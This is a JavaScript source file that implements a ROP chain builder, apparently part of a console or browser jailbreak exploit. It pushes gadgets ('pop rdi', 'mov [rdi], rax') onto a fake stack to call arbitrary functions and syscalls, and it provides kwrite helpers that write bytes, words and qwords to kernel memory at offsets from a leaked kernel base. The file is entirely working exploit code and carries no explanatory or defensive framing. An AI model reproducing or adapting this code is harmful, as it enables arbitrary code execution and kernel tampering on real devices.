const stack_sz = 0x40000,
  reserve_upper_stack = 0x10000,
  stack_reserved_idx = 0x4000;

function rop() {
  this.stackback = p.malloc(stack_sz / 4 + 0x8, 4);
  this.stack = this.stackback.add32(reserve_upper_stack);
  this.stack_array = this.stackback.backing;
  this.retval = this.stackback.add32(stack_sz);
  this.count = 1;
  this.branches_count = 0;

  this.clear = function () {
    this.count = 1;
    this.branches_count = 0;
    for (var i = 1; i < stack_sz / 4 - stack_reserved_idx; i++) this.stack_array[i + stack_reserved_idx] = 0;
  };

  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  };

  this.finalizeSymbolic = function (idx, val) {
    if (val instanceof int64) {
      this.stack_array[stack_reserved_idx + idx * 2] = val.low;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
    } else {
      this.stack_array[stack_reserved_idx + idx * 2] = val;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
    }
  };

  this.push = function (...vals) {
    for (var i = 0; i < vals.length; i++) this.finalizeSymbolic(this.pushSymbolic(), vals[i]);
  };

  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) this.push(gadgets["pop rdi"], rdi);
    if (rsi != undefined) this.push(gadgets["pop rsi"], rsi);
    if (rdx != undefined) this.push(gadgets["pop rdx"], rdx);
    if (rcx != undefined) this.push(gadgets["pop rcx"], rcx);
    if (r8 != undefined) this.push(gadgets["pop r8"], r8);
    if (r9 != undefined) this.push(gadgets["pop r9"], r9);
    if (this.stack.add32(this.count * 0x8).low & 0x8) this.push(gadgets["ret"]);
    this.push(rip);
    return this;
  };

  this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
    this.write_result(this.retval);
    this.run();
    return p.read8(this.retval);
  };

  this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    return this.call(syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
  };

  this.get_rsp = function () {
    return this.stack.add32(this.count * 8);
  };

  this.write_result = function (where) {
    this.push(gadgets["pop rdi"], where, gadgets["mov [rdi], rax"]);
  };

  this.write_result4 = function (where) {
    this.push(gadgets["pop rdi"], where, gadgets["mov [rdi], eax"]);
  };

  this.run = function () {
    p.launch_chain(this);
    this.clear();
  };

  this.set_kernel_var = function (arg) {
    this.KERNEL_BASE_PTR_VAR = arg;
  };

  this.rax_kernel = function (offset) {
    this.push(gadgets["pop rax"], this.KERNEL_BASE_PTR_VAR, gadgets["mov rax, [rax]"], gadgets["pop rsi"], offset, gadgets["add rax, rsi"]);
  };

  this.write_kernel_addr_to_chain_later = function (offset) {
    this.push(gadgets["pop rdi"]);
    var idx = this.pushSymbolic();
    this.rax_kernel(offset);
    this.push(gadgets["mov [rdi], rax"]);
    return idx;
  };

  this.kwrite4 = function (offset, dword) {
    this.rax_kernel(offset);
    this.push(gadgets["pop rdx"], dword, gadgets["mov [rax], edx"]);
  };

  this.kwrite2 = function (offset, word) {
    this.rax_kernel(offset);
    this.push(gadgets["pop rcx"], word, gadgets["mov [rax], cx"]);
  };

  this.kwrite1 = function (offset, byte) {
    this.rax_kernel(offset);
    this.push(gadgets["pop rcx"], byte, gadgets["mov [rax], cl"]);
  };

  this.kwrite8_kaddr = function (offset1, offset2) {
    this.rax_kernel(offset2);
    this.push(gadgets["mov rdx, rax"]);
    this.rax_kernel(offset1);
    this.push(gadgets["mov [rax], rdx"]);
  };

  return this;
}
